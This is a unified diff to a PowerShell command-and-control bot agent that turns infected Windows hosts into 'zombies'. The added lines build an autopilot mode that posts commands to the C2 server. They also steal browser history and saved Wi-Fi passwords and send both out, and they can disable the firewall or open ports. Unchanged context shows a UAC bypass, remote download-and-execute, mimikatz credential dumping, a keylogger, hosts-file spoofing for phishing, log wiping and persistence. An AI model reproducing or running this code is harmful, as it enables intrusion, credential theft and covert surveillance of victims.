@@ -85,6 +85,7 @@ MYENCODED
 "@  # add downexec payload in encoded form
 [string] $Global:c2OpsChannel = "C2CHANNEL" # icmp, twitter, dropbox, gmail, dns, http/s
 [string] $Global:DomainOrWorkgroup = (Get-WmiObject Win32_ComputerSystem).Domain
+[string] $Global:OSbuild = [System.Environment]::OSVersion.Version.Major
 $ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
 $devideID = Get-WmiObject win32_networkadapterconfiguration | where {$_.IPAddress -eq $ip} | select SettingID
 $w = $ip.split('.')[0]
@@ -103,7 +104,6 @@ for($i=0; $i -lt $gp.Name.Length; $i++){ $admin_member = $gp.Name.Item($i)
     if ($admin_member -eq $CurrentSession){ 
 	[string] $Global:IsAdminMember = $true }
 }
-[string] $Global:OSbuild = [System.Environment]::OSVersion.Version.Major
 ######################################################################
 
 # Test PS version and download CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
@@ -156,7 +156,8 @@ if ($pshversion -lt 3) {
 			param( [string]$Text )
 			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 			$EncodedText =[Convert]::ToBase64String($Bytes)
-			$EncodedText
+			#$sDecodedString=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($sEncodedString))
+			#$EncodedText
 		}
 		function sendC2 { # send result to c2
 	   		[CmdletBinding()] param( 
@@ -169,6 +170,30 @@ if ($pshversion -lt 3) {
 			if ($pshversion -lt 3) {
 			Curl $pc $result $id } else {
 			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/ok.php" -Method POST -Body $postParams
+			}
+		}
+		function sendCommandC2 { # Send command to c2 (usefull for autopilot and scenario driven)
+	   		[CmdletBinding()] param( 
+			[string]$pc,
+			[string]$cmd
+			)
+			$cmd = base64EncodeText $cmd
+			$postParams = @{pc=$pc;cmd=$cmd}
+			if ($pshversion -lt 3) {
+			Curl_Cmd $pc $cmd } else {
+			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/cmd.php" -Method POST -Body $postParams
+			}
+		}
+		function sendUpdatedCommandC2 { # Update command in c2 (usefull for autopilot and scenario driven)
+	   		[CmdletBinding()] param( 
+			[string]$id,
+			[string]$cmd
+			)
+			$cmd = base64EncodeText $cmd
+			$postParams = @{id=$id;cmd=$cmd}
+			if ($pshversion -lt 3) {
+			Curl_Cmd $id $cmd } else {
+			Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/link/pilot.php" -Method POST -Body $postParams
 			}
 		}
 		function RunJob { # execute command inside a Job
@@ -281,7 +306,7 @@ iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/$runURL"))
 				{$usercredsObject}
 			else {$usercreds }
 		}		
-		function Invk-EvtVwrBypass { # execute command in privileged mode with eventviewer bypass UAC technique
+		function InvkEvtVwrBypass { # execute command in privileged mode with eventviewer bypass UAC technique
 			[CmdletBinding()] param( 
 			[String]$Command,
 			[Switch]$Force
@@ -291,7 +316,8 @@ iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/$runURL"))
 					Set-FilelessBypassUac -Method mscfile -Option CommandLine -CommandLine $Command
 				}else {
 					Set-FilelessBypassUac -Method ms-settings -Option CommandLine -CommandLine $Command}
-				}   
+				}  
+            #  !lockpriv				
 			}
 		function TestInternet { # Check internet connexion
 			[CmdletBinding()] 
@@ -549,16 +575,36 @@ Function Invoke-Pnt {
 			$result = "Encoded Vector changed to: $myAgntencoded"
 			sendC2 $pc $result $id
             }	
+		Function PilotCommand { # !pilot|http://127.0.0.1/www/link/pilot.xml - Used to give a schema to zombies so that they will autopilot. How: they process the .xml file instructions, create and send to C2 the list of pré-formatted commands that they will execute 
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $xmlpilot = $LatestOrder.split('|')[1]
+            Write-Verbose "Send command at:  $xmlpilot"
+			$XMLCmdAutoPilot = New-Object System.Xml.XmlDocument
+            $XMLCmdAutoPilot.Load($xmlpilot)
+			$cmd = $XMLCmdAutoPilot.autopilot.pilot.cmd
+			$XMLCmdAutoPilot.autopilot.pilot | Foreach { $CommandToSend = $_.cmd; 
+				sendCommandC2 $pc $CommandToSend ;
+				}
+			$result = "ok"
+			sendC2 $pc $result $id
+			}
+	#	Function lockprivCommand {}
 	# Download & Run command > BEGIN
-		Function RunCommand {# !run|0|echo bonjour  -  !run|1|calc   -
+		Function RunCommand { # !run|0|echo bonjour -  !run|1|calc - !run|2|net localgroup adminstrators # 1= yes run in job,  0= no job ,  2= no job & upload results in txt
             [CmdletBinding()] param( 
 			[string]$id
 			)
-			[string] $inJob = $LatestOrder.split('|')[1] # 1= yes,    0= no & upload,     2= no & no upload
+			[string] $inJob = $LatestOrder.split('|')[1] # 0= no job , 1= yes run in job, 2= no job & upload results in txt
 			[string] $Command = $LatestOrder.Substring(7)
             [string] $CmdPath = "$env:windir\System32\cmd.exe"
             [string] $CmdString = "$CmdPath" + " /C " + "$Command"
+			
             if ($inJob -eq "0") {
+				$result = Invoke-Expression $CmdString	
+			}
+			if ($inJob -eq "2") {
 				$dd = Get-Date -Format MM-dd-yyyy-H-mm-ss
 				[string] $runfile = "$env:userprofile\AppData\run-$dd.txt"
 				$rs = Invoke-Expression $CmdString
@@ -566,9 +612,6 @@ Function Invoke-Pnt {
 				exfiltrate $runfile
 				$result = "$c2c/ROOT_FOLDER/exfil/$pc/run-$dd.txt"
 				Remove-Item $runfile
-			}
-			if ($inJob -eq "2") {
-				$result = Invoke-Expression $CmdString
 			}else{
 				RunJob -code $Command
 				$result = "ok"
@@ -617,7 +660,7 @@ Function Invoke-Pnt {
 			sendC2 $pc $result $id
         }
 	# Spoofing  > BEGIN
-		Function DnsSpoofCommand { #!dnsspoof|127.0.0.1  facebook.com|0
+		Function DnsSpoofCommand { #!dnsspoof|127.0.0.1  facebook.com|0     - 1 : add spoof entry   0 : Clean all
             [CmdletBinding()] param( 
 			[string]$id
 			)
@@ -626,26 +669,22 @@ Function Invoke-Pnt {
 			[string] $CmdPath = "$env:windir\System32\cmd.exe"
             if ($clean -eq "1") {
 				if ($IsAdmin -eq $True) {
-				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
-				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
-				Invoke-Expression $CmdString
-				}else{
-				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
-				Invk-EvtVwrBypass -Command $Command
+				Add-Content $env:SystemRoot\System32\drivers\etc\hosts -Value $entry
+				$result = get-content $env:SystemRoot\System32\drivers\etc\hosts
+				}
+				else{
+				$result = "Not a shell with privileges - try privesc"
 				}
 			}
 			else { 
 				if ($IsAdmin -eq $True) {
-				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
-				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
-				Invoke-Expression $CmdString
+				Set-Content $env:SystemRoot\System32\drivers\etc\hosts -Value "#"
+				$result = get-content $env:SystemRoot\System32\drivers\etc\hosts
 				}else{
-				[string] $Command = "echo $entry > $env:SystemRoot\System32\drivers\etc\hosts"
-				Invk-EvtVwrBypass -Command $Command
+				$result = "Not a shell with privileges - try privesc"
 				}
 			}
-			[string]$result = "ok"
-			exfiltrate $env:SystemRoot\System32\drivers\etc\hosts 			
+			#	exfiltrate $env:SystemRoot\System32\drivers\etc\hosts 			
 			sendC2 $pc $result $id
         }
 		Function InveighCommand {      # !ntlmspoof
@@ -659,7 +698,7 @@ IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/Inveigh.txt
 			RunJob -code $cmde
 			$result = "Wait 20min and use !exfilfile|Inveigh-Log.txt"			
 			} else {
-			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command  !ntlmspoof"
+			$result = "Need shell with privileges ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command  !ntlmspoof"
 				}
 			sendC2 $pc $result $id
 			}
@@ -694,7 +733,7 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$reconfile0 = "$env:userprofile\AppData\"+$reconfile
 			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/recon.txt")
             ModReconCommand $reconfile0
-			$result = "$c2c/ROOT_FOLDER/exfil/$pc/$reconfile - powershell version:$pshversion"
+			$result = " -Powershell_version: $pshversion   - Current_user_admin_membership: $IsAdminMember - Shell_priveleged: $IsAdmin  -  $c2c/ROOT_FOLDER/exfil/$pc/$reconfile"
 			Exfiltrate $reconfile0
 			Remove-Item $reconfile0
 			sendC2 $pc $result $id
@@ -753,7 +792,7 @@ portscan -StartAddress $StartAddress -EndAddress $EndAddress -ResolveHost -ScanP
 			[string]$id
 			)
 			[string] $path = $LatestOrder.split('|')[1]
-			$result = (get-acl $path).access | ft IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -auto
+			$result = (get-acl $path).access 
 			sendC2 $pc $result $id
 			}		
 		Function EnumShareCommand { #!enumshare|toto|F8580EAGFH89725
@@ -822,8 +861,21 @@ Exfilt "$env:userprofile\AppData\enumshare.txt"
 			$result = "enumshare.txt" 
 			sendC2 $pc $result $id
 			}			
-        Function WannacryCheckCommand {		# !wcry	
-			#MS17-010 Wannacry Checker
+        Function WebHistoryCommand { #!webhistory  -  Get All browsers Navigation history
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/webhistory.txt"))
+			$rs = Get-BrowserData	
+			$dd = Get-Date -Format MM-dd-yyyy-H-mm-ss
+			[string] $runfile = "$env:userprofile\AppData\WebHistory-$dd.txt"
+			set-content $runfile -Value $rs
+			exfiltrate $runfile
+			$result = "$c2c/ROOT_FOLDER/exfil/$pc/WebHistory-$dd.txt"
+			Remove-Item $runfile
+			sendC2 $pc $result $id
+			}
+		Function WannacryCheckCommand {		# !wcry	- Scan Eternalblue (Wannacry) vulnerability ! MS17-010
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -874,22 +926,9 @@ Exfilt "$env:userprofile\AppData\enumshare.txt"
 			if ($IsAdmin -eq $True) {
 			[string]$result = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
 			#$result += Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
-			} else { $result = "Not admin"}
+			} else { $result = "Not a shell with elevated privileges - try privesc commands "}
 			sendC2 $pc $result $id
 		}
-		Function ExtractKeyCommand { # !extractkey    OR remotely: !extractkey|domain\admin|password 
-			[CmdletBinding()] param( 
-			[string]$id
-			)
-			[string] $user = $LatestOrder.split('|')[1]
-			[string] $pass = $LatestOrder.split('|')[2]
-			if ($IsAdmin -eq $True) { 
-			IEX(New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/SessGopher.txt")
-				if (!$user) {[string]$result = Invoke-SessionGopher -Thorough}
-				else {[string]$result = Invoke-SessionGopher -AllDomain -u $user -p $pass}
-			}else {$result = "Not admin"}
-			sendC2 $pc $result $id
-		}	
 	# Throlling  > BEGIN
 		Function UrlCommand { # !url|iexplore.exe|on / off|http://www.youtube.com/watch?v=dQw4w9WgXcQ
             [CmdletBinding()] param( 
@@ -1019,7 +1058,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/klog.txt")
 			$result = "ok"	
 			sendC2 $pc $result $id
         }       
-		Function SniffCommand { # !sniff|10
+		Function SniffCommand { # !sniff|10  -  Capture TCP/IP packet - Open with Microsoft Message Analyzer
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1050,11 +1089,11 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/klog.txt")
                     Get-Job | Remove-Job -Force        
                 }
 				$result = "$TraceFilePath"
-            } else { $result = "Not Admin" }
+            } else { $result = "Need shell with privileges - try privesc" }
 			
 			sendC2 $pc $result $id
 	   }
-        Function WebcamCommand {
+        Function WebcamCommand { # !webcam - Take Webcam screenshot
 			[CmdletBinding()] param( 
 			[string]$id
 			)			
@@ -1253,7 +1292,7 @@ PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
 			$result = "ok";
 			sendC2 $pc $result $id
 		   }   
-		Function HttpServerCommand { # !http|8080  -  setup local http server and host a page 
+		Function HttpServerCommand { # !http|8080  -  setup local http server and host a page (Efficient if used with DNSSPOOF: you setup phishing page and you host redir.html To redirect local victim to your phishing page
             [CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1263,10 +1302,10 @@ PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
 			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/redir.html","$env:userprofile\AppData\w\index.html")
 			(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/link/http.txt","$env:userprofile\AppData\http.exe")
 			downloadFile "$c2c/ROOT_FOLDER/link/http.txt" "$env:userprofile\AppData\http.exe"
-			attriib +h $env:userprofile\AppData\http.exe
+			attrib +h $env:userprofile\AppData\http.exe
 			$Command = "$env:userprofile\AppData\http.exe $httppath $httpport";
 			RunJob -code $Command;
-			$result = "ok";
+			$result = "HTTP SERVER OK. - Send files to be hosted here: $env:userprofile\AppData\w";
 			sendC2 $pc $result $id;
 		   }     
         Function MmikatzCommand {   # !mimikatz -  dump windows pass
@@ -1334,7 +1373,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 			Exfiltrate .\chrpwd.txt
 			Exfiltrate .\ffpwd.txt
 			} else {
-			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command !hashdump"
+			$result = "Need shell with privileges ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command !hashdump"
 				}
 			sendC2 $pc $result $id
 		}
@@ -1381,6 +1420,36 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 			$result +="Open dump file with Mimikatz to retrieve the creds --> mimikatz # sekurlsa::minidump procdump.dmp  AND >mimikatz # sekurlsa::logonPasswords"
 			sendC2 $pc $result $id;
 		   }		   
+		Function WifiCredsCommand { # !wificreds|SSID_NAME - Extract stored WIFI credentials
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $ssid= $LatestOrder.split('|')[1]				
+			[string] $Command = "netsh.exe wlan show profiles name=$ssid key=clear"
+			[string] $CmdPath = "$env:windir\System32\cmd.exe"
+			[string] $CmdString = "$CmdPath" + " /C " + "$Command"
+			$dd = Get-Date -Format MM-dd-yyyy-H-mm-ss
+			[string] $runfile = "$env:userprofile\AppData\WifiCredentials-$dd.txt"
+			$rs = Invoke-Expression $CmdString
+			set-content $runfile -Value $rs
+			exfiltrate $runfile
+			$result = "$c2c/ROOT_FOLDER/exfil/$pc/WifiCredentials-$dd.txt"
+			Remove-Item $runfile
+			sendC2 $pc $result $id
+		} 
+		Function ExtractKeyCommand { # !extractkey OR remotely: !extractkey|domain\admin|password  - Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $user = $LatestOrder.split('|')[1]
+			[string] $pass = $LatestOrder.split('|')[2]
+			if ($IsAdmin -eq $True) { 
+			IEX(New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/SessGopher.txt")
+				if (!$user) {[string]$result = Invoke-SessionGopher -Thorough}
+				else {[string]$result = Invoke-SessionGopher -AllDomain -u $user -p $pass}
+			}else {$result = "Need shell with privileges"}
+			sendC2 $pc $result $id
+		}	
 	# Privileges escalation  > BEGIN
 		Function PrivescCommand {  # !privesc
 			[CmdletBinding()] param( 
@@ -1409,7 +1478,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 			Remove-Item .\privesc-vulns.txt
 			sendC2 $pc $result $id
         }
-		Function GetsystemCommand { # !getsystem - Try various privesc technic (obtain PID like !getpid|lsass)
+		Function GetsystemCommand { # !getsystem|1/2/3 - Try various privesc technic (obtain PID like !getpid|lsass)
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1434,16 +1503,16 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 			$result = "$who "			
 			sendC2 $pc $result $id
 		}
-		Function ElevateCommand { # !elevate|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
+		Function RunAsCommand { # !runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
             [CmdletBinding()] param( 
 			[string]$id
 			)	
 			[string] $cmdtoexec = $LatestOrder.split('|')[1]
             if ($IsAdmin -eq $False) {
-				$CmdArgs = "-Exe Bypass -NoL $cmdtoexec"
-                $CmdString = "Start-Process PowerShell.exe -Verb RunAs -ArgumentList $CmdArgs"
+                $CmdString = "Start-Process PowerShell.exe -Verb RunAs -ArgumentList $cmdtoexec"
                 Invoke-Expression $CmdString  
-			$result ='ok. you can run !run|exit, if you want to avoid concurrent non-privileged execution'
+			$result ="ok." 
+			# !lockpriv ACTIVATED !!!... 
 			sendC2 $pc $result $id
             }
 			else {
@@ -1460,7 +1529,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/chr-dump.t
 			if(!$cmd){
 				$cmd = "cmd /c powershell -exe bypass -win hidden -enc $myAgntencoded"
 			}
-			$rs += Invk-EvtVwrBypass -Command "$cmd"
+			$rs += InvkEvtVwrBypass -Command "$cmd"
 			$result = $rs		
 			sendC2 $pc $result $id
 			}
@@ -1575,7 +1644,7 @@ powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebC
 				$cmd_persist = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nol -win hidden -enc $myAgntencoded" 
 				IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/wmipersist.txt"));
 				wmiPersistence $cmd_persist
-				} else {$result += "not admin"}
+				} else {$result += "Need shell with privileges - try privesc"}
 				}
 			function persistStartup {
 				if ($IsAdmin -eq $True) {
@@ -2003,7 +2072,7 @@ Invoke-DBC2
 				$result += "RDP activation OK. Service set to AUTO. no need to run this command again after a reboot. Use !ngrok to expose port 3389"
 				sendC2 $pc $result $id
 			} else {
-				$result = "RDP activation FAIL! Need Admin Session /!\"
+				$result = "RDP activation FAIL! Need shell with privileges - try privesc /!\"
 				sendC2 $pc $result $id
 			}
 		}
@@ -2055,7 +2124,7 @@ ncat $serverIP $serverPort
 			[string]$id
 			)
 			if ($IsAdmin -eq $True) { $result = wevtutil el | Foreach-Object {wevtutil cl $_} }
-			else { $result="No admin privs"}
+			else { $result="Need shell with privileges - try privesc"}
 			sendC2 $pc $result $id
 			}
 		Function SysmonKillCommand { # Check if sysmon is installed and kill it
@@ -2069,10 +2138,10 @@ ncat $serverIP $serverPort
 					}
 				$result= "Before: $IsSysmon - After: $AfterSysmonKill"
 				}
-			else {$result = "No Admin Right"}
+			else {$result = "Need shell with privileges - try privesc"}
 			sendC2 $pc $result $id
 			}
-		Function LogBypassCommand { # !logbypass    -   Ivoke-phant0m
+		Function LogBypassCommand { # !logbypass    -   Invoke-phant0m  invisible mode activated against eventviewer
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -2084,7 +2153,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/InvkPhantom
 			$r2 = "OK, invisible mode activated against eventviewer"
 			$result = "$r2"			
 			} else {
-			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !LogBypassCommand"
+			$result = "Need shell with privileges! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !LogBypassCommand"
 				}
 			sendC2 $pc $result $id
 			}
@@ -2106,7 +2175,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/InvkPhantom
 			Exfiltrate $exportFileName
 			Remove-Item $exportFileName
 			} else {
-			$result = "Not Admin"
+			$result = "Need shell with privileges - try privesc"
 			}
 			sendC2 $pc $result $id
 			
@@ -2126,19 +2195,26 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 			$result ='BEFORE: $r1  `n  AFTER: $r2'
 			sendC2 $pc $result $id
 		}    
-		Function FirewallCommand { #!firewall|on / off
+		Function FirewallCommand { #!firewall|on / off|8080   - Desactivate or activate firewall and also specify a port to open in and out
 			[CmdletBinding()] param( 
 			[string]$id
 			)
 			[string] $State = $LatestOrder.split('|')[1]
-			if ($state -eq "on") {netsh advfirewall set allprofiles state on}
+			[string] $portToOpen = $LatestOrder.split('|')[2]
+			if ($IsAdmin -eq $True) {
+				if ($state -eq "on") {
+				netsh advfirewall set allprofiles state on
+				netsh advfirewall firewall add rule name="Port $portToOpen" dir=in action=allow protocol=TCP localport=$portToOpen
+				netsh advfirewall firewall add rule name="Port $portToOpen" dir=out action=allow protocol=TCP localport=$portToOpen 
+				}
+				if ($state -eq "off") {netsh advfirewall set allprofiles state off}
+			} 
+			else {$result = "Fail !!!  Need shell with privileges - try privesc"}
 			
-			if ($state -eq "off") {netsh advfirewall set allprofiles state off}
-			#netsh advfirewall firewall add rule name="Port $portToOpen" dir=in action=allow protocol=TCP localport=$portToOpen
-			#netsh advfirewall firewall add rule name="Port $portToOpen" dir=out action=allow protocol=TCP localport=$portToOpen 
 			$dd = get-date -f yyyyMMdd
 			netsh advfirewall firewall show rule name=all > "$env:userprofile\appdata\firewall-$dd.txt"
-			$result = "firewall-$dd.txt"
+			
+			$result = $result + "firewall-$dd.txt"
 			Exfiltrate "$env:userprofile\appdata\firewall-$dd.txt"
 			sendC2 $pc $result $id
 			Remove-Item "$env:userprofile\appdata\firewall-$dd.txt"
@@ -2356,9 +2432,33 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 			$XMLCmdChannelResult = New-Object System.Xml.XmlDocument
             $XMLCmdChannelResult.Load($CmdChannelURL)
 			[string[]] $LatestOrderArray = @()
-			$XMLCmdChannelResult.statuses.status.text
+			$CmdToSend = $XMLCmdChannelResult.statuses.status.text
 			$XMLCmdChannelResult.statuses.status | Foreach { $LatestOrder = $_.text; $id = $_.id; 
-			#Operate -LatestOrder $text -id $LatestOrderID				
+			[string]$ReEvaluatedCmd = $CmdToSend.split('|')[0]
+			# Analyse for AUTOPILOT MODE and Rebuild command if necessary
+				$nbre_Param = ($LatestOrder.Split('|')).count-1 # Count number of parameter to select $i interval
+				For ($i=1; $i -le $nbre_Param; $i++) { # Now for each parameter extract and evaluate and rebuild command if TAG "RESULT" is present. 
+					$cmd = $LatestOrder.split('|')[$i]
+					$tag = $cmd.Substring(0,6) # if fist 6 characters (the $tag) equal to "RESULT", extract the command after the "=" and GET its result.
+					if ($tag -eq "RESULT") {
+						$cmd_ToRequest_new_param = $cmd.split('=')[1]
+						$cmd_ToRequest_new_param
+						
+						#Retreive the result of this command. it is encoded in base64, so decode it first
+						$XMLCmdResultPilot = New-Object System.Xml.XmlDocument
+						$XMLCmdResultPilot.Load("$c2c/ROOT_FOLDER/link/getresult.php?pc=$pc&cmd=$cmd")
+						$result_ofCmd = $XMLCmdResultPilot.statuses.status.result
+						$id = $XMLCmdResultPilot.statuses.status.id
+						$result_ofCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($result_ofCmd))
+						# And use that result to rebuild the command for the pilot
+						$ReEvaluatedCmd = $ReEvaluatedCmd +"|$result_ofCmd" 
+					} 
+					else {
+						$ReEvaluatedCmd = $ReEvaluatedCmd +"|" + $cmd   # Rebuild Command
+					}	
+				} 
+			sendUpdatedCommandC2 $id $ReEvaluatedCmd 
+			
 			try {
 			Write-Verbose "Check Kill Date"
             KillDateChecker
@@ -2394,28 +2494,30 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
             Write-Verbose "Evaluating command $BotCommand"
 			Switch ($BotCommand) {
 				!quit {QuitCommand $id}				  #  !quit   -     Delete all artifacts and clean computer. The end of operations
-                !hello {HelloCommand $id}			  #  !hello
-                !changec2 {ChangeC2Command $id}		  #  !changec2|http:\newc2cserver.com
+                !hello {HelloCommand $id}			  #  !hello -  ping c2
+                !changec2 {ChangeC2Command $id}		  #  !changec2|http:\newc2cserver.com  -  Switch c2 server
 				!vector {EncodedVectorCommand $id}	  #  !vector|SBOFSBOFSBOF== Change the encoded string of payload vector
+				!lock {lockprivCommand $id}           #  !lock  -  This command is used to Pass hand from unprivileged to priveleged shell. When you run a privesc or bypassuac, if it's already PRIV, it doesn't execute. Otherwise, once executed, the shell check if it is PRIV, push !lock command if TRUE and stay locked. Only the NO-PRIV can unlock by putting result to 1 and kill itself to pass hand.
 				!beef {BeefCommand $id}               #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
                 !choco {ChocoInstallCommand $id}      #  !choco  - install Choco and some usefull plug
-				!aptget {AptGetCommand $id}           # !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco
+				!aptget {AptGetCommand $id}           #  !aptget|php OR !aptget|python2 OR !aptget|curl OR !aptget|wget - install package with linux style using CHOCOLATEY. You must first run !choco
 				!pshupgrade {UpgradePShCommand $id}   #  !pshupgrade  --  upgrade powershell version
 				!speak {SpeakCommand $id}			  #  !speak|you have been, hacked.
-				!recon {ReconCommand $id}             #  !recon
-				!getpid {GetPidCommand $id}			  #  !getpid|lsass -- Get the PID of a process
+				!recon {ReconCommand $id}             #  !recon - Grab intelligence about victim environment (computers, networks, shares, security,...etc) ALWAYS use it FIRST
+				!webhistory {WebHistoryCommand $id}	  #	 !webhistory  -  Get All browsers Navigation history
+				!getpid {GetPidCommand $id}			  #  !getpid|lsass -- Get the PID of a process 
 				!whoami {WhoAmICommand $id}			  #  !whoami  -  Who am I
 				!update {UpdateCommand $id}           #  !update --    Update c2c and every others usefull stuff
-				!exfilfile {ExfilFilesCommand $id}    #  !exfilfile|C:\users\secret.zip         
+				!exfilfile {ExfilFilesCommand $id}    #  !exfilfile|C:\users\secret.zip  -  Exfiltrate local File to C2       
 				!zip {ZipCommand $id}                 #  !zip|C:\users\public\documents\|C:\users\secret.zip
-                !exfiltrate {ExfiltrateCommand $id}   #  !exfiltrate|C:\users\  
+                !exfiltrate {ExfiltrateCommand $id}   #  !exfiltrate|C:\users\  -  Exfiltrate local folder to C2 
 				!explorer {ExplorerCommand $id}       #  !explorer|1|  >only list share -   !explorer|0|C:\users >only list specified local folder  -  !explorer|1|C:\users  >list shares and specified local folder 
 				!acl {AclCommand $id} 				  #  !acl|C:\users\toto.txt  -  Return NTFS Permission of the given share, local file or folder
 				!enumshare {EnumShareCommand $id}	  #  !enumshare|toto|F8580EAGFH89725   -  scan all the domain IP and enumerate shares using hash of the provided credentials 
 				!enumsession {EnumSessionCommand $id} #  !enumsession|toto|F8580EAGFH89725 -  scan all the domain IP and enumerate sessions using hash of the provided credentials 
 				!extractkey {ExtractKeyCommand $id}   #  !extractkey    OR remotely: !extractkey|domain\admin|password 
 				!outlook {Get-Outlook $id}  		  #  !outlook        - List all pst archives
-				!run {RunCommand $id}				  #  !run|net localgroup adminstrators > c:\windows\temp\ad.txt
+				!run {RunCommand $id}				  #  !run|0|echo bonjour -  !run|1|calc - !run|2|net localgroup adminstrators # 1= yes run in job,  0= no job ,  2= no job & upload results in txt
                 !downexec {downexecCommand $id}		  #  !downexec|http://pastebinlikesite.com/moreevilpowershellscript.txt
                 !download {downloadCommand $id}		  #  !download|http://tools.hackarmoury.com/general_tools/nc/nc.exe|c:\windows\temp\svchost.exe
                 !bits {bitsadminCommand $id}		  #  !bits|http://tools.com/nc.exe|c:\windows\temp\svchost.exe
@@ -2428,7 +2530,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
                 !wcry {WannacryCheckCommand $id}      #  !wcry       -    Check system against WannaCry MS17-010 vulnerability
 				!popup {PopupCommand $id}			  #  !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
                 !persist {PersistCommand $id}		  #  !persist|reg/ startup/ task/ wmi/ sc/ all |calc
-                !elevate {ElevateCommand $id}		  #  !elevate|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
+                !runas {RunAsCommand $id}		      #  !runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/link/pnt.ps1"))
 				!privesc {PrivescCommand $id}	      #  !privesc - Try to inject token in privilegied process and Check local privesc vulnerabilities (sherlock  & powerUp)
 				!migrate {MigrateCommand $id} 		  #  !migrate     - Inject shellcode into the process ID (default = explorer) of your choosing or within the context of the running PowerShell process.
 				!ntlmspoof {InveighCommand $id}	  	  #  !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)
@@ -2443,7 +2545,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!ngrok {NgrokTunnelCommand $id} 	  #  !ngrok|authkey|http|80     - Expose zombie(TCP/IP) PC to Internet so that you can connect any tools
 				!socks {SocksProxyCommand $id} 		  #	 !socks|1234 - Create a Socks 4/5 proxy on port 1234
 				!portfwd {PortFwdCommand $id} 		  #  !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward. liste localy on 33389 and forward to local 3389			
